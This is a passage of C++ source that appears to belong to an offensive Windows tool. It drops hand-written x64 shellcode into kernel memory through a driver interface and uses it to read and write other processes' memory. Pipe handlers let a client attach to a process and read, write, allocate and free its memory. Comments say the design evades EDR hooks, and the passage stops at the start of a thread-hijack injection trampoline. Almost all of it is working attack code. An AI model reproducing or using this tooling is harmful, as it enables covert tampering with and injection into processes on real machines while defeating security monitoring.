    // .detach_only: KeUnstackDetachProcess(&ApcState) ; return ReadOk
    0x48, 0x8D, 0x4B, 0x70,                            // lea rcx, [rbx+0x70]
    0x48, 0x8B, 0x43, 0x38,                            // mov rax, [rbx+0x38]       ; FnKeUnstackDetachProcess
    0xFF, 0xD0,                                        // call rax
    0x8B, 0x43, 0x20,                                  // mov eax, [rbx+0x20]       ; ReadOk
    0x48, 0x83, 0xC4, 0x40,                            // add rsp, 0x40
    0x5B,                                              // pop rbx
    0xC3,                                              // ret
};
static_assert(sizeof(kReadMdlShellcode) == 178, "kReadMdlShellcode size drifted");

// Read up to `size` bytes from `va` in the target process via R0 MDL lock.
// Caller must call with single-page chunks for safety — if the lock raises
// on a bad page, the box bugchecks. Returns true on full read.
// Caches resolved exports and the dropped shellcode pool on first call.
//
// `cr3` is the target's DirectoryTableBase. When non-zero, we run the
// IsVaLockableForMdl pre-check first and refuse to issue the kernel call
// for VAs whose PTE would deterministically raise (no VAD / demand-zero
// / weird software PTE). cr3==0 disables the pre-check (legacy callers).
static bool ReadTargetMemViaMdl(AsioProvider& kernel, uint64_t eprocess, uint64_t cr3,
                                uint64_t va, void* outBuffer, size_t size) {
    if (!eprocess || !va || !outBuffer || !size) return false;
    if (size > (1ull << 20)) return false;  // 1 MiB cap per call (caller chunks)

    // Double PTE pre-check: read PTE twice with a small gap to reduce the
    // TOCTOU window between our check and MmProbeAndLockPages. If the page
    // transitions between checks, bail — the target is actively paging and
    // we'd race the kernel pager.
    if (cr3) {
        if (!IsVaLockableForMdl(kernel, cr3, va, size))
            return false;
        // Second check — catches pages being paged out between reads
        if (!IsVaLockableForMdl(kernel, cr3, va, size)) {
            std::wcout << L"[!] MDL read: PTE changed between double-check at va=0x"
                       << std::hex << va << std::dec << std::endl;
            return false;
        }
    }

    static uint64_t s_shellPool = 0;
    static uint64_t s_fnKeAttach = 0;
    static uint64_t s_fnKeDetach = 0;
    static uint64_t s_fnIoAllocMdl = 0;
    static uint64_t s_fnMmProbeLock = 0;
    static uint64_t s_fnMmMapLockedSpecify = 0;
    static uint64_t s_fnMmUnlock = 0;
    static uint64_t s_fnIoFreeMdl = 0;
    static uint64_t s_fnMemcpy = 0;

    if (!s_fnKeAttach) {
        const uint64_t ntoskrnl = kernel.NtoskrnlBase();
        s_fnKeAttach           = kernel.GetKernelModuleExport(ntoskrnl, "KeStackAttachProcess");
        s_fnKeDetach           = kernel.GetKernelModuleExport(ntoskrnl, "KeUnstackDetachProcess");
        s_fnIoAllocMdl         = kernel.GetKernelModuleExport(ntoskrnl, "IoAllocateMdl");
        s_fnMmProbeLock        = kernel.GetKernelModuleExport(ntoskrnl, "MmProbeAndLockPages");
        s_fnMmMapLockedSpecify = kernel.GetKernelModuleExport(ntoskrnl, "MmMapLockedPagesSpecifyCache");
        s_fnMmUnlock           = kernel.GetKernelModuleExport(ntoskrnl, "MmUnlockPages");
        s_fnIoFreeMdl          = kernel.GetKernelModuleExport(ntoskrnl, "IoFreeMdl");
        s_fnMemcpy             = kernel.GetKernelModuleExport(ntoskrnl, "memcpy");
        if (!s_fnKeAttach || !s_fnKeDetach || !s_fnIoAllocMdl || !s_fnMmProbeLock ||
            !s_fnMmMapLockedSpecify || !s_fnMmUnlock || !s_fnIoFreeMdl || !s_fnMemcpy) {
            std::wcerr << L"[-] MDL read: failed to resolve required exports" << std::endl;
            return false;
        }
    }

    if (!s_shellPool) {
        s_shellPool = kernel.AllocatePool(sizeof(kReadMdlShellcode));
        if (!s_shellPool) {
            std::wcerr << L"[-] MDL read: shellcode pool alloc failed" << std::endl;
            return false;
        }
        if (!kernel.WriteKernelMemory(s_shellPool, kReadMdlShellcode, sizeof(kReadMdlShellcode))) {
            std::wcerr << L"[-] MDL read: failed to drop shellcode" << std::endl;
            s_shellPool = 0;
            return false;
        }
    }

    const uint64_t destPool = kernel.AllocatePool(size);
    if (!destPool) {
        std::wcerr << L"[-] MDL read: dest pool alloc failed (size=0x"
                   << std::hex << size << std::dec << L")" << std::endl;
        return false;
    }
    const uint64_t cmdPool = kernel.AllocatePool(sizeof(R0ReadMdlCmd));
    if (!cmdPool) {
        std::wcerr << L"[-] MDL read: cmd pool alloc failed" << std::endl;
        kernel.FreePool(destPool);
        return false;
    }

    R0ReadMdlCmd cmd{};
    cmd.Eprocess                       = eprocess;
    cmd.Va                             = va;
    cmd.Size                           = size;
    cmd.DestBuf                        = destPool;
    cmd.ReadOk                         = 0;
    cmd.FnKeStackAttachProcess         = s_fnKeAttach;
    cmd.FnKeUnstackDetachProcess       = s_fnKeDetach;
    cmd.FnIoAllocateMdl                = s_fnIoAllocMdl;
    cmd.FnMmProbeAndLockPages          = s_fnMmProbeLock;
    cmd.FnMmMapLockedPagesSpecifyCache = s_fnMmMapLockedSpecify;
    cmd.FnMmUnlockPages                = s_fnMmUnlock;
    cmd.FnIoFreeMdl                    = s_fnIoFreeMdl;
    cmd.FnMemcpy                       = s_fnMemcpy;
    if (!kernel.WriteKernelMemory(cmdPool, &cmd, sizeof(cmd))) {
        std::wcerr << L"[-] MDL read: failed to write cmd struct" << std::endl;
        kernel.FreePool(destPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    uint32_t shellReturn = 0;
    const bool callOk = kernel.CallKernelFunction(&shellReturn, s_shellPool, cmdPool);
    if (!callOk) {
        std::wcerr << L"[-] MDL read: CallKernelFunction returned false" << std::endl;
        kernel.FreePool(destPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    R0ReadMdlCmd resp{};
    const bool respOk = kernel.ReadKernelMemory(cmdPool, &resp, sizeof(resp));
    if (!respOk || !resp.ReadOk) {
        std::wcerr << L"[-] MDL read: shellcode reported ReadOk=0 (mdl alloc or map failed)" << std::endl;
        kernel.FreePool(destPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    const bool copyOk = kernel.ReadKernelMemory(destPool, outBuffer, size);
    kernel.FreePool(destPool);
    kernel.FreePool(cmdPool);
    return copyOk;
}

// Symmetric MDL write helper. Same EDR-evasion rationale and trade-offs
// as the read path; differs only in:
//   * MmProbeAndLockPages's third arg is IoWriteAccess (1) not IoReadAccess
//   * memcpy direction is reversed: src=SrcBuf (kernel pool we filled
//     with the caller's bytes), dst=sysAddr (mapped target page).
//
// Layout identical to R0ReadMdlCmd except DestBuf -> SrcBuf and
// ReadOk -> WriteOk. Different struct + shellcode keeps the byte
// arithmetic explicit and verifiable.
#pragma pack(push, 8)
struct R0WriteMdlCmd {
    uint64_t Eprocess;
    uint64_t Va;
    uint64_t Size;
    uint64_t SrcBuf;
    uint32_t WriteOk;
    uint32_t Pad0;
    uint64_t MdlScratch;
    uint64_t FnKeStackAttachProcess;
    uint64_t FnKeUnstackDetachProcess;
    uint64_t FnIoAllocateMdl;
    uint64_t FnMmProbeAndLockPages;
    uint64_t FnMmMapLockedPagesSpecifyCache;
    uint64_t FnMmUnlockPages;
    uint64_t FnIoFreeMdl;
    uint64_t FnMemcpy;
    uint8_t  ApcState[0x30];
};
#pragma pack(pop)
static_assert(sizeof(R0WriteMdlCmd) == 0xA0, "R0WriteMdlCmd must be 0xA0 bytes");

// 181-byte x64 shellcode. Same skeleton as kReadMdlShellcode; the two
// material deltas (vs the read variant) are highlighted in comments.
// Entry: rcx = &cmd. Returns cmd->WriteOk (0/1) in eax.
static const uint8_t kWriteMdlShellcode[] = {
    // prologue: push rbx ; sub rsp, 0x40 ; mov rbx, rcx
    0x53,
    0x48, 0x83, 0xEC, 0x40,
    0x48, 0x89, 0xCB,

    // KeStackAttachProcess(Eprocess, &ApcState)
    0x48, 0x8B, 0x0B,                                  // mov rcx, [rbx]
    0x48, 0x8D, 0x53, 0x70,                            // lea rdx, [rbx+0x70]
    0x48, 0x8B, 0x43, 0x30,                            // mov rax, [rbx+0x30]
    0xFF, 0xD0,                                        // call rax

    // mdl = IoAllocateMdl(Va, (ULONG)Size, FALSE, FALSE, NULL)
    0x48, 0x8B, 0x4B, 0x08,                            // mov rcx, [rbx+0x08]
    0x8B, 0x53, 0x10,                                  // mov edx, [rbx+0x10]
    0x45, 0x31, 0xC0,                                  // xor r8d, r8d
    0x45, 0x31, 0xC9,                                  // xor r9d, r9d
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,  // mov qword [rsp+0x20], 0
    0x48, 0x8B, 0x43, 0x40,                            // mov rax, [rbx+0x40]
    0xFF, 0xD0,                                        // call rax
    0x48, 0x89, 0x43, 0x28,                            // mov [rbx+0x28], rax
    0x48, 0x85, 0xC0,                                  // test rax, rax
    0x74, 0x68,                                        // jz .detach_only (+0x68)

    // *** DIFF vs read: 3rd arg = IoWriteAccess (1) not IoReadAccess (0).
    // MmProbeAndLockPages(mdl, UserMode=1, IoWriteAccess=1)
    0x48, 0x89, 0xC1,                                  // mov rcx, rax
    0xBA, 0x01, 0x00, 0x00, 0x00,                      // mov edx, 1   ; UserMode
    0x41, 0xB8, 0x01, 0x00, 0x00, 0x00,                // mov r8d, 1   ; IoWriteAccess
    0x48, 0x8B, 0x43, 0x48,                            // mov rax, [rbx+0x48]
    0xFF, 0xD0,                                        // call rax

    // sysAddr = MmMapLockedPagesSpecifyCache(mdl, KernelMode=0, MmCached=0,
    //                                        NULL, FALSE, NormalPagePriority|MdlMappingNoExecute)
    0x48, 0x8B, 0x4B, 0x28,                            // mov rcx, [rbx+0x28]
    0x31, 0xD2,                                        // xor edx, edx
    0x45, 0x31, 0xC0,                                  // xor r8d, r8d
    0x4D, 0x31, 0xC9,                                  // xor r9, r9
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,  // mov qword [rsp+0x20], 0
    0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x40,    // mov dword [rsp+0x28], 0x40000010
    0x48, 0x8B, 0x43, 0x50,                            // mov rax, [rbx+0x50]
    0xFF, 0xD0,                                        // call rax
    0x48, 0x85, 0xC0,                                  // test rax, rax
    0x74, 0x18,                                        // jz .unlock_free (+0x18)

    // *** DIFF vs read: memcpy direction inverted.
    // memcpy(sysAddr, SrcBuf, Size)
    0x48, 0x89, 0xC1,                                  // mov rcx, rax              ; dst = sysAddr
    0x48, 0x8B, 0x53, 0x18,                            // mov rdx, [rbx+0x18]       ; src = SrcBuf
    0x4C, 0x8B, 0x43, 0x10,                            // mov r8,  [rbx+0x10]       ; Size
    0x48, 0x8B, 0x43, 0x68,                            // mov rax, [rbx+0x68]       ; FnMemcpy
    0xFF, 0xD0,                                        // call rax
    0xC7, 0x43, 0x20, 0x01, 0x00, 0x00, 0x00,          // mov dword [rbx+0x20], 1   ; cmd->WriteOk = 1

    // .unlock_free: MmUnlockPages(mdl) ; IoFreeMdl(mdl)
    0x48, 0x8B, 0x4B, 0x28,
    0x48, 0x8B, 0x43, 0x58,
    0xFF, 0xD0,
    0x48, 0x8B, 0x4B, 0x28,
    0x48, 0x8B, 0x43, 0x60,
    0xFF, 0xD0,

    // .detach_only: KeUnstackDetachProcess(&ApcState) ; return WriteOk
    0x48, 0x8D, 0x4B, 0x70,
    0x48, 0x8B, 0x43, 0x38,
    0xFF, 0xD0,
    0x8B, 0x43, 0x20,
    0x48, 0x83, 0xC4, 0x40,
    0x5B,
    0xC3,
};
static_assert(sizeof(kWriteMdlShellcode) == 181, "kWriteMdlShellcode size drifted");

// Write up to `size` bytes from `inBuffer` to `va` in the target process
// via R0 MDL lock-and-copy. Same single-page-granularity guidance as the
// read helper; caller (HandleWrite) is responsible for chunking.
// `cr3` enables the PTE pre-check exactly as in ReadTargetMemViaMdl.
static bool WriteTargetMemViaMdl(AsioProvider& kernel, uint64_t eprocess, uint64_t cr3,
                                 uint64_t va, const void* inBuffer, size_t size) {
    if (!eprocess || !va || !inBuffer || !size) return false;
    if (size > (1ull << 20)) return false;

    // Double PTE pre-check (same TOCTOU reduction as read path)
    if (cr3) {
        if (!IsVaLockableForMdl(kernel, cr3, va, size))
            return false;
        if (!IsVaLockableForMdl(kernel, cr3, va, size)) {
            std::wcout << L"[!] MDL write: PTE changed between double-check at va=0x"
                       << std::hex << va << std::dec << std::endl;
            return false;
        }
    }

    static uint64_t s_shellPool = 0;
    static uint64_t s_fnKeAttach = 0;
    static uint64_t s_fnKeDetach = 0;
    static uint64_t s_fnIoAllocMdl = 0;
    static uint64_t s_fnMmProbeLock = 0;
    static uint64_t s_fnMmMapLockedSpecify = 0;
    static uint64_t s_fnMmUnlock = 0;
    static uint64_t s_fnIoFreeMdl = 0;
    static uint64_t s_fnMemcpy = 0;

    if (!s_fnKeAttach) {
        const uint64_t ntoskrnl = kernel.NtoskrnlBase();
        s_fnKeAttach           = kernel.GetKernelModuleExport(ntoskrnl, "KeStackAttachProcess");
        s_fnKeDetach           = kernel.GetKernelModuleExport(ntoskrnl, "KeUnstackDetachProcess");
        s_fnIoAllocMdl         = kernel.GetKernelModuleExport(ntoskrnl, "IoAllocateMdl");
        s_fnMmProbeLock        = kernel.GetKernelModuleExport(ntoskrnl, "MmProbeAndLockPages");
        s_fnMmMapLockedSpecify = kernel.GetKernelModuleExport(ntoskrnl, "MmMapLockedPagesSpecifyCache");
        s_fnMmUnlock           = kernel.GetKernelModuleExport(ntoskrnl, "MmUnlockPages");
        s_fnIoFreeMdl          = kernel.GetKernelModuleExport(ntoskrnl, "IoFreeMdl");
        s_fnMemcpy             = kernel.GetKernelModuleExport(ntoskrnl, "memcpy");
        if (!s_fnKeAttach || !s_fnKeDetach || !s_fnIoAllocMdl || !s_fnMmProbeLock ||
            !s_fnMmMapLockedSpecify || !s_fnMmUnlock || !s_fnIoFreeMdl || !s_fnMemcpy) {
            std::wcerr << L"[-] MDL write: failed to resolve required exports" << std::endl;
            return false;
        }
    }

    if (!s_shellPool) {
        s_shellPool = kernel.AllocatePool(sizeof(kWriteMdlShellcode));
        if (!s_shellPool) return false;
        if (!kernel.WriteKernelMemory(s_shellPool, kWriteMdlShellcode, sizeof(kWriteMdlShellcode))) {
            s_shellPool = 0;
            return false;
        }
    }

    // SrcBuf needs to be a kernel pool address holding the caller's bytes.
    const uint64_t srcPool = kernel.AllocatePool(size);
    if (!srcPool) return false;
    if (!kernel.WriteKernelMemory(srcPool, inBuffer, size)) {
        kernel.FreePool(srcPool);
        return false;
    }
    const uint64_t cmdPool = kernel.AllocatePool(sizeof(R0WriteMdlCmd));
    if (!cmdPool) {
        kernel.FreePool(srcPool);
        return false;
    }

    R0WriteMdlCmd cmd{};
    cmd.Eprocess                       = eprocess;
    cmd.Va                             = va;
    cmd.Size                           = size;
    cmd.SrcBuf                         = srcPool;
    cmd.WriteOk                        = 0;
    cmd.FnKeStackAttachProcess         = s_fnKeAttach;
    cmd.FnKeUnstackDetachProcess       = s_fnKeDetach;
    cmd.FnIoAllocateMdl                = s_fnIoAllocMdl;
    cmd.FnMmProbeAndLockPages          = s_fnMmProbeLock;
    cmd.FnMmMapLockedPagesSpecifyCache = s_fnMmMapLockedSpecify;
    cmd.FnMmUnlockPages                = s_fnMmUnlock;
    cmd.FnIoFreeMdl                    = s_fnIoFreeMdl;
    cmd.FnMemcpy                       = s_fnMemcpy;
    if (!kernel.WriteKernelMemory(cmdPool, &cmd, sizeof(cmd))) {
        kernel.FreePool(srcPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    uint32_t shellReturn = 0;
    const bool callOk = kernel.CallKernelFunction(&shellReturn, s_shellPool, cmdPool);
    if (!callOk) {
        kernel.FreePool(srcPool);
        kernel.FreePool(cmdPool);
        return false;
    }

    R0WriteMdlCmd resp{};
    const bool respOk = kernel.ReadKernelMemory(cmdPool, &resp, sizeof(resp));
    kernel.FreePool(srcPool);
    kernel.FreePool(cmdPool);
    return respOk && resp.WriteOk;
}

static bool PipeSendResponse(HANDLE pipe, int32_t status,
                             const void* payload, uint64_t payload_len) {
    AsioR0Response rsp{};
    rsp.magic = ASIO_R0_RSP_MAGIC;
    rsp.version = ASIO_R0_PROTO_VERSION;
    rsp.status = status;
    rsp.payload_len = payload_len;
    if (!PipeWriteAll(pipe, &rsp, sizeof(rsp))) return false;
    if (payload_len && payload) {
        if (!PipeWriteAll(pipe, payload, static_cast<size_t>(payload_len))) return false;
    }
    return true;
}

// Read 4 KiB of PE header from the target to recover SizeOfImage. Returns 0
// on any error (caller treats 0 as "unknown size"). If `eprocess` is
// supplied, ReadTargetMem failures degrade to ReadTargetMemViaMdl so we
// can still recover the image size when the PE header pages have been
// swapped out (which is exactly the case ATTACH used to fail on).
static uint64_t QueryTargetImageSize(AsioProvider& kernel, uint64_t cr3, uint64_t base, uint64_t eprocess) {
    auto readHdrChunk = [&](uint64_t va, void* buf, size_t len) -> bool {
        if (ReadTargetMem(kernel, cr3, va, buf, len)) return true;
        if (!eprocess) return false;
        // Single-page chunked MDL fallback. PE header is < 4 KiB so this
        // is at most one or two pages — bounded raise risk.
        constexpr size_t kPage = 0x1000;
        auto* out = static_cast<uint8_t*>(buf);
        size_t done = 0;
        while (done < len) {
            const uint64_t pageOffset = (va + done) & (kPage - 1);
            const size_t chunk = std::min<size_t>(len - done, kPage - pageOffset);
            if (!ReadTargetMemViaMdl(kernel, eprocess, cr3, va + done, out + done, chunk)) {
                return false;
            }
            done += chunk;
        }
        return true;
    };

    uint8_t dos[0x40] = {};
    if (!readHdrChunk(base, dos, sizeof(dos))) {
        std::wcout << L"[!] QueryTargetImageSize failed: DOS read failed at base=0x"
                   << std::hex << base << L" cr3=0x" << cr3 << std::dec << std::endl;
        return 0;
    }
    if (dos[0] != 'M' || dos[1] != 'Z') {
        std::wcout << L"[!] QueryTargetImageSize failed: MZ missing at base=0x"
                   << std::hex << base << std::dec << std::endl;
        return 0;
    }
    const uint32_t e_lfanew = *reinterpret_cast<uint32_t*>(&dos[0x3C]);
    if (e_lfanew == 0 || e_lfanew > 0x1000) {
        std::wcout << L"[!] QueryTargetImageSize failed: bad e_lfanew=0x"
                   << std::hex << e_lfanew << std::dec << std::endl;
        return 0;
    }
    uint8_t ntHdr[0x108] = {};
    if (!readHdrChunk(base + e_lfanew, ntHdr, sizeof(ntHdr))) {
        std::wcout << L"[!] QueryTargetImageSize failed: NT read failed at va=0x"
                   << std::hex << (base + e_lfanew) << std::dec << std::endl;
        return 0;
    }
    if (ntHdr[0] != 'P' || ntHdr[1] != 'E') {
        std::wcout << L"[!] QueryTargetImageSize failed: PE missing at va=0x"
                   << std::hex << (base + e_lfanew) << std::dec << std::endl;
        return 0;
    }
    const uint32_t sizeOfImage =
        *reinterpret_cast<uint32_t*>(&ntHdr[4 + sizeof(IMAGE_FILE_HEADER) + 0x38]);
    return sizeOfImage;
}

static int32_t HandleAttach(AsioProvider& kernel, PipeSession& s,
                            const std::vector<uint8_t>& payload) {
    if (payload.size() < sizeof(uint32_t)) return ASIO_ERR_BAD_PAYLOAD;
    const uint32_t pid = *reinterpret_cast<const uint32_t*>(payload.data());
    if (!pid) return ASIO_ERR_BAD_PAYLOAD;

    std::wcout << L"[*] ATTACH pid=" << pid << std::endl;

    const uint64_t epr = ResolveTargetEprocess(kernel, pid);
    if (!epr) {
        std::wcout << L"[!] ATTACH failed: ResolveTargetEprocess returned 0" << std::endl;
        return ASIO_ERR_RESOLVE;
    }
    std::wcout << L"[+] ATTACH eprocess=0x" << std::hex << epr << std::dec << std::endl;

    const uint64_t cr3 = ReadTargetCr3(kernel, epr);
    if (!cr3) {
        std::wcout << L"[!] ATTACH failed: ReadTargetCr3 returned 0" << std::endl;
        return ASIO_ERR_RESOLVE;
    }
    std::wcout << L"[+] ATTACH cr3=0x" << std::hex << cr3 << std::dec << std::endl;

    const uint64_t base = GetTargetMainImageBase(kernel, epr);
    if (!base) {
        std::wcout << L"[!] ATTACH failed: GetTargetMainImageBase returned 0" << std::endl;
        return ASIO_ERR_RESOLVE;
    }
    std::wcout << L"[+] ATTACH imageBase=0x" << std::hex << base << std::dec << std::endl;

    const uint64_t size = QueryTargetImageSize(kernel, cr3, base, epr);
    std::wcout << L"[+] ATTACH imageSize=0x" << std::hex << size << std::dec << std::endl;

    s.pid = pid;
    s.eprocess = epr;
    s.cr3 = cr3;
    s.imageBase = base;
    s.imageSize = size;

    // Open process handle for page-fault fallback reads
    if (s.targetProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(s.targetProcess);
    }
    s.targetProcess = OpenProcess(PROCESS_VM_READ, FALSE, pid);
    if (s.targetProcess == INVALID_HANDLE_VALUE) {
        std::wcout << L"[!] ATTACH: OpenProcess(PROCESS_VM_READ) failed err=" << GetLastError()
                   << L" — page-fault fallback disabled" << std::endl;
    } else {
        std::wcout << L"[+] ATTACH: page-fault fallback handle ready" << std::endl;
    }

    return ASIO_OK;
}

static int32_t HandleRead(AsioProvider& kernel, PipeSession& s,
                          const std::vector<uint8_t>& payload,
                          std::vector<uint8_t>& outBytes) {
    if (s.cr3 == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0ReadReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0ReadReq*>(payload.data());
    if (!req->size || req->size > (64ull << 20)) return ASIO_ERR_BAD_PAYLOAD;

    outBytes.assign(static_cast<size_t>(req->size), 0);
    if (!ReadTargetMem(kernel, s.cr3, req->va, outBytes.data(), outBytes.size())) {
        // CR3 page walk failed (non-present / soft-faulted page). Fall back
        // to a pure-MDL R0 read inside the target's address space — this
        // path uses only ordinary I/O exports (IoAllocateMdl /
        // MmProbeAndLockPages / MmMapLockedPagesSpecifyCache / memcpy /
        // MmUnlockPages / IoFreeMdl), which EDRs do NOT hook (every
        // legitimate driver pounds on these constantly).
        //
        // We walk one 4 KiB page at a time:
        //   * MmProbeAndLockPages raises on lock failure and our shellcode
        //     has no SEH, so a single bad page bugchecks.
        //   * Per-page chunking keeps a partial result on disk: every page
        //     up to the bad one has already been written to outBytes.
        //   * Stops on first failure and treats partial reads as full
        //     failure to match the previous semantics. If you want
        //     best-effort partials, switch the `break` to `continue` —
        //     but only after auditing the bugcheck risk.
        if (!s.eprocess) {
            return ASIO_ERR_VA_TO_PA;
        }
        constexpr size_t kPage = 0x1000;
        const uint64_t base = req->va;
        const uint64_t total = req->size;
        uint64_t done = 0;
        bool fallbackOk = true;
        while (done < total) {
            const uint64_t pageOffset = (base + done) & (kPage - 1);
            const size_t chunk = static_cast<size_t>(
                std::min<uint64_t>(total - done, kPage - pageOffset));
            if (!ReadTargetMemViaMdl(kernel, s.eprocess, s.cr3, base + done,
                                     outBytes.data() + done, chunk)) {
                fallbackOk = false;
                std::wcout << L"[!] READ MDL fallback failed at va=0x"
                           << std::hex << (base + done)
                           << L" chunk=0x" << chunk
                           << L" done=0x" << done
                           << L" total=0x" << total << std::dec << std::endl;
                break;
            }
            done += chunk;
        }
        if (fallbackOk) {
            // Page tables may have changed once the kernel paged the region
            // back in — refresh the cached CR3 so the next call's main
            // path can succeed without taking the fallback again.
            const uint64_t newCr3 = ReadTargetCr3(kernel, s.eprocess);
            if (newCr3) s.cr3 = newCr3;
            std::wcout << L"[+] READ ok (R0 MDL fallback): pid=" << s.pid
                       << L" va=0x" << std::hex << req->va
                       << L" size=0x" << req->size << std::dec << std::endl;
            return ASIO_OK;
        }
        std::wcout << L"[!] READ failed: pid=" << s.pid
                   << L" cr3=0x" << std::hex << s.cr3
                   << L" va=0x" << req->va
                   << L" size=0x" << req->size << std::dec << std::endl;
        return ASIO_ERR_VA_TO_PA;
    }
    std::wcout << L"[+] READ ok: pid=" << s.pid
               << L" va=0x" << std::hex << req->va
               << L" size=0x" << req->size << std::dec << std::endl;
    return ASIO_OK;
}

static int32_t HandleWrite(AsioProvider& kernel, PipeSession& s,
                           const std::vector<uint8_t>& payload, uint64_t& outWritten) {
    if (s.cr3 == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0WriteReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0WriteReq*>(payload.data());
    // Bound req->size BEFORE the addition to avoid uint64_t overflow on
    // attacker-controlled values like 0xFFFFFFFFFFFFFFFF, where
    // sizeof(req) + req->size wraps to a small number and slips past the
    // payload-size check.
    if (req->size > (64ull << 20)) return ASIO_ERR_BAD_PAYLOAD;
    if (req->size > payload.size() - sizeof(AsioR0WriteReq)) return ASIO_ERR_BAD_PAYLOAD;
    if (!req->size) { outWritten = 0; return ASIO_OK; }

    const uint8_t* src = payload.data() + sizeof(AsioR0WriteReq);
    if (!WriteTargetMem(kernel, s.cr3, req->va, src, static_cast<size_t>(req->size))) {
        // CR3 page walk failed — fall back to R0 MDL write inside the
        // target's address space. Same single-page granularity as
        // HandleRead's fallback to bound the MmProbeAndLockPages raise blast
        // radius.
        if (!s.eprocess) return ASIO_ERR_VA_TO_PA;
        constexpr size_t kPage = 0x1000;
        const uint64_t base = req->va;
        const uint64_t total = req->size;
        uint64_t done = 0;
        bool fallbackOk = true;
        while (done < total) {
            const uint64_t pageOffset = (base + done) & (kPage - 1);
            const size_t chunk = static_cast<size_t>(
                std::min<uint64_t>(total - done, kPage - pageOffset));
            if (!WriteTargetMemViaMdl(kernel, s.eprocess, s.cr3, base + done,
                                      src + done, chunk)) {
                fallbackOk = false;
                std::wcout << L"[!] WRITE MDL fallback failed at va=0x"
                           << std::hex << (base + done)
                           << L" chunk=0x" << chunk
                           << L" done=0x" << done
                           << L" total=0x" << total << std::dec << std::endl;
                break;
            }
            done += chunk;
        }
        if (!fallbackOk) {
            outWritten = done;
            return ASIO_ERR_VA_TO_PA;
        }
        const uint64_t newCr3 = ReadTargetCr3(kernel, s.eprocess);
        if (newCr3) s.cr3 = newCr3;
        std::wcout << L"[+] WRITE ok (R0 MDL fallback): pid=" << s.pid
                   << L" va=0x" << std::hex << req->va
                   << L" size=0x" << req->size << std::dec << std::endl;
    }
    outWritten = req->size;
    return ASIO_OK;
}

static int32_t HandleGetBase(PipeSession& s, AsioR0AttachResp& out) {
    if (!s.imageBase) return ASIO_ERR_NOT_ATTACHED;
    out.cr3 = s.cr3;
    out.image_base = s.imageBase;
    out.image_size = s.imageSize;
    return ASIO_OK;
}

static int32_t HandleEnumModules(AsioProvider& kernel, PipeSession& s,
                                 std::vector<uint8_t>& outBytes) {
    if (s.cr3 == 0 || s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;

    const uint64_t peb = ReadTargetPeb(kernel, s.eprocess);
    if (!peb) return ASIO_ERR_RESOLVE;

    std::vector<TargetUserModule> modules;
    {
        TargetEprocessScope _epScope(s.eprocess);
        EnumerateTargetUserModules(kernel, s.cr3, peb, modules);
    }
    if (modules.size() < 4) {
        std::wcerr << L"[!] PEB walk returned only " << modules.size()
                   << L" modules for pid " << s.pid
                   << L"; falling back to CreateToolhelp32Snapshot."
                   << std::endl
                   << L"    WARNING: this fallback issues a R3 syscall against "
                      L"the target and breaks the R0-only invariant. The fallback "
                      L"path is visible to user-mode hooks on Toolhelp/NtQuery-"
                      L"SystemInformation that watch the target process."
                   << std::endl;
        std::vector<TargetUserModule> snapshotModules;
        if (EnumerateUserModulesToolhelp(s.pid, snapshotModules) && snapshotModules.size() > modules.size()) {
            modules = std::move(snapshotModules);
        }
    }
    if (modules.empty()) {
        return ASIO_ERR_RESOLVE;
    }

    uint64_t totalSize = sizeof(AsioR0ModuleListResp);
    for (const auto& mod : modules) {
        totalSize += sizeof(AsioR0ModuleEntry) + mod.Name.size();
    }

    outBytes.clear();
    outBytes.reserve(static_cast<size_t>(totalSize));

    const auto appendBytes = [&outBytes](const void* data, size_t size) {
        const auto* p = static_cast<const uint8_t*>(data);
        outBytes.insert(outBytes.end(), p, p + size);
    };

    AsioR0ModuleListResp header{};
    header.count = static_cast<uint32_t>(modules.size());
    appendBytes(&header, sizeof(header));

    for (const auto& mod : modules) {
        AsioR0ModuleEntry entry{};
        entry.base = mod.Base;
        entry.size = mod.Size;
        entry.name_len = static_cast<uint32_t>(mod.Name.size());
        appendBytes(&entry, sizeof(entry));
        if (!mod.Name.empty()) {
            appendBytes(mod.Name.data(), mod.Name.size());
        }
    }

    return ASIO_OK;
}

static int32_t HandleAlloc(AsioProvider& kernel, PipeSession& s,
                           const std::vector<uint8_t>& payload, uint64_t& outVa) {
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(AsioR0AllocReq)) return ASIO_ERR_BAD_PAYLOAD;
    const auto* req = reinterpret_cast<const AsioR0AllocReq*>(payload.data());
    if (!req->size || req->size > (256ull << 20)) return ASIO_ERR_BAD_PAYLOAD;

    const uint64_t va = AllocateTargetUserMem(kernel, s.eprocess,
                                              static_cast<size_t>(req->size),
                                              req->protection);
    if (!va) return ASIO_ERR_NOMEM;
    outVa = va;
    std::wcout << L"[+] ALLOC ok: pid=" << s.pid
               << L" va=0x" << std::hex << va
               << L" size=0x" << req->size
               << L" prot=0x" << req->protection << std::dec << std::endl;
    return ASIO_OK;
}

static int32_t HandleFree(AsioProvider& kernel, PipeSession& s,
                          const std::vector<uint8_t>& payload) {
    if (s.eprocess == 0) return ASIO_ERR_NOT_ATTACHED;
    if (payload.size() < sizeof(uint64_t)) return ASIO_ERR_BAD_PAYLOAD;
    const uint64_t va = *reinterpret_cast<const uint64_t*>(payload.data());
    if (!va) return ASIO_ERR_BAD_PAYLOAD;
    if (!FreeTargetUserMem(kernel, s.eprocess, va)) return ASIO_ERR_INTERNAL;
    std::wcout << L"[+] FREE ok: pid=" << s.pid
               << L" va=0x" << std::hex << va << std::dec << std::endl;
    return ASIO_OK;
}

// Build a context-preserving trampoline for thread-hijack injection.
//   pushfq; save volatile + nonvolatile GPRs;
//   save rsp into rbx; and rsp,-16; sub rsp,0x20  (Win64 ABI alignment)
